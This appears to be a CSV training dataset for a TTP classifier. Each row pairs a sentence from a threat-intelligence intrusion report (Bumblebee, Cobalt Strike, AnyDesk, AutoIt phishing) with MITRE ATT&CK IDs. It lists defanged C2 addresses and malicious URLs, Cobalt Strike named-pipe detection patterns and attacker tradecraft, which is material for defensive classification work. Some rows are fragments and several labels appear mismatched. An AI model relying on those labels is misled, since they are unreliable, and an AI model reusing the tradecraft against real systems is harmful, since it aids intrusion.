text,label
"Option/Command Details (from the code) ‘v’ or “Vulnerability” “Search for available vulnerabilities for using LPE tools””Scans the operating system for vulnerabilities and displays a list of tools for a LPE” ‘m’ or “MicrosoftUpdates” “List of all installed microsoft updates””Displays a list installed Microsoft updates” ‘h’ or “HotFixes” “List of installed hot fixes””Displays a list of installed hot fixes” ‘s’ or “SupportedCve” “List of implemented tools for LPE “”Displays list of implemented CVE for LPE” ‘i’ or “SystemInfo” “Display information about current Windows version “ Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping: Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.","T1078, T1082"
"Below are all the command lines run by the adversaries: Lateral Movement Lateral Tool Transfer Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server: The threat actors also transferred ProcDump from the beachhead to multiple workstations: Remote Services Remote Desktop Protocol Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server: Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account: This first lateral movement was performed in order to drop and install AnyDesk.","T1570, T1055, T1021.001, T1078"
"SMB/Windows Admin Shares Remote Service over RPC Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into: These RPC connections targeted multiple hosts, including workstations, servers, and DCs.","T1055, T1218.011"
"As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.","T1106, T1543.003"
"On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”.",T1543.003
Below is an example of the service edc603a that was created on a Domain Controller:,"T1543.003, T1078"
The account used to perform this lateral movement was one of the kerberoasted service accounts.,"T1218.011, T1078"
The random (PsExec) service runs a rundll32.exe process without any arguments.,T1218.011
"We observed this beacon performing various techniques (Process injections in svchost process via CreateRemoteThread, Default named pipes, etc.) Command and Control The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into: BumbleBee 142.91.3[.]109 45.140.146[.]30 All the active Bumblebee command and control shared a common server configuration in regards to TLS setup.",T1055
"Pty Ltd Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.","T1105, T1055"
"Named pipes were created in order to establish communication between CS processes: In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4}.",T1090
Below is the full list of all default named pipes spotted during this intrusion: \postex_0dde \postex_3e9b \postex_4008 \postex_4429 \postex_55f8 \postex_8248 \postex_8c73 \postex_972d \postex_fc2e Named piped are commonly used by Cobalt Strike perform various techniques.,T1090
"AnyDesk As mentioned before in the lateral tool transfer section, threat actors remotely dropped AnyDesk binary on a server from the beachhead: A new service was created (Event ID 7045) upon the execution of AnyDesk installer:","T1570, T1543.003, T1219"
"AnyDesk logs, %ProgramData%\AnyDesk\ad_svc.trace",T1219
and,T1219
"%AppData%\AnyDesk\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the Administrator account each time.","T1078, T1219"
"This threat actor employs tactics such as LOLBaS (Living Off the Land Binaries and Scripts), along with CMD-based scripts to carry out its malicious activities.",T1059.003
"In this case, the threat actor behind the campaign used CMD-based scripts, AutoIt scripts, and LOLBaS. LOLBaS and CMD-based scripts help threat actors avoid detection by traditional security measures.",T1059.003
"By utilizing these techniques, they can gain unauthorized access to victims' systems, extract sensitive information, and ultimately compromise online banking accounts and payment systems.",T1005
"Their selection of countries is likely influenced by the prevalence of online banking usage in these regions, making them lucrative targets for financial fraud.",T1059.003
The first .CMD file set seen to use AutoIt in its execution was discovered at the end of 2021.,T1059.003
Each email has an HTML attachment.,T1566.001
"Figure 2 – Phishing email contents The email text employs scare tactics, such as evidence of a traffic violation, prompting the user to open the HTML attachment which contains some junk code and data in HEX format.","T1027, T1566.001, T1204.002"
"Figure 3 – ""multa_de_transito_502323.html"" attachment content The data blob in HEX decodes to a slightly obfuscated URL address which upon cleanup translates to: hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q. This URL resolves to: 162.0.232[.]115 IP address.","T1027, T1140"
"During the extensive analysis of the “.HTML” files, BlackBerry identified a large list of HEX-encoded URLs, some of which are listed here: hxxps[:]//factura61[.]click/2/?j5szsmo0bk8tOSQSMS4mmp1XtQrmbNYoCB2GBem8 hxxps[:]//factura61[.]click/2/?vzlv9CZ1gnLrNIaWBJBhJNWRCt7IVXDDwVzOQhSs hxxps[:]//sunat-pe[.]fun/?D80gaUJDUfuLG6lodTSEi7qoqciBWk5xE5w81pJO hxxps[:]//factura61[.]click/2/?CTtBmkRN8KPXVTgUn1ArCPGb5WXTXTaT7etdD7TC hxxps[:]//factura61[.]click/2/?yqJl8r7henupax3WsUvITb0PuSw5sn7HyZWGMvDv hxxps[:]//factura61[.]click/2/?GxkVBvEBTFfSDqaFr8Yjw9kyKH01xRseHoF0DNQc hxxps[:]//multa-ansr-pt[.]fun/?UFqQBhFaXulvEfeTbI38FFDKRth1r2DWKOFqUI0Y hxxps[:]//multa-ansr-pt[.]fun/?l4mm0DEhDbJPYd5qAQmwst09TDTjjvYjiG7ByCvx Opening the attached “multa_de_transito_502323.html” file triggers the embedded JavaScript and reaches out to hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q to pull down the next stage which is a compressed archive (RAR) file.",T1027
"Weaponization The contents of the previously mentioned archive include a single “.CMD” file typically titled from one of the following filenames, (but there are other names): doc-Impuestos.cmd doc-Impostos.cmd Impuestos-Documento.cmd doc_Factura.cmd Documento_Impostos.cmd The “.CMD” file is large, ranging between 1.34 - 1.37MBs, and consists of two base64 encoded data blobs and code instructions for its execution.",T1027
